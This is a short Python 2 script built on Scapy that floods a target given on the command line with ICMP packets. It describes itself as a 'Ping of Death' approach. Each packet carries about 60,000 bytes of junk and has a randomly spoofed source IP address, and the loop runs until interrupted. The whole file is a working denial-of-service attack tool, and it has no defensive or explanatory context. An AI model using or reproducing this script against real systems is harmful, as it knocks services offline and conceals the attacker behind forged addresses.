from scapy.all import *
import random
import time
from colorama import init, Fore, Back, Style
init(autoreset=False)

def address_spoofer():
    
    addr = [192, 168, 0 , 1]
    d = '.'
    addr[0] = str(random.randrange(11,197))
    addr[1] = str(random.randrange(0,255))
    addr[2] = str(random.randrange(0,255))
    addr[3] = str(random.randrange(2,254))
    assemebled = addr[0]+d+addr[1]+d+addr[2]+d+addr[3]
    print assemebled
    return assemebled

if(len(sys.argv) < 2) :
    print 'Usage : sudo python pingtd.py hostname'
    sys.exit()

start = time.time()
target = sys.argv[1]
#target = raw_input("Enter the target to attack: ")
#if not target:
 #   target = "192.168.1.79"

count=0
go = ""
print ( Fore.CYAN + Back.MAGENTA + Style.BRIGHT +" set color ") 

while not go:
    try:
        count+=1
        #Ping of Death way:
 
        print  count, " pings." 
        rand_addr = address_spoofer()
        ip_hdr = IP(src=rand_addr, dst=target)
        packet = ip_hdr/ICMP()/("m"*60000) #send 60k bytes of junk
        send(packet)

    except KeyboardInterrupt: 
        break

stop = time.time()        
dur = stop - start
print "&&&&&&&&&&&&&&&&&&&&&&&&&&& Running time: ", dur, " Press enter to exit."       
time.sleep(10)








